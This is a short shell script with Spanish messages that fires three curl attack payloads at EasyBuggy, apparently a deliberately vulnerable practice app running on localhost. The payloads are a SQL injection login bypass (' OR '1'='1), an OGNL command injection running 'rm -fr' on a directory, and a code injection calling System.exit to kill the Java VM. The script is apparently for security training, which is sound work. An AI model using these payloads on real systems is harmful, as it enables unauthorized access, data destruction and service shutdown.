
#Ataque de inyeccion SQL
echo "Inyeccion SQL"
sudo curl -X POST -d "name=Mark&password=' OR '1'='1" localhost:8080/easybuggy/sqlijc > sqlinjection.html
echo "Hecho, puedes verlo en sqlinjection.html"
echo " "

echo " "
#Ataque de inyeccion OS
echo "Inyeccion OS"
sudo curl -X POST -d "expression=@Runtime@getRuntime().exec('rm -fr /your-important-dir/')" localhost:8080/easybuggy/ognleijc > osinjection.html
echo "Hecho, se ha eliminado una carpeta importante"
echo " "

echo " "
#Ataque de inyeccion de Codigo
echo "Inyeccion de Codigo"
sudo curl -X POST -d "jsonString={}');java.lang.System.exit(0);//" localhost:8080/easybuggy/codeijc
echo "Hecho, se ha cerrado la maquina virtual de java"
echo " "

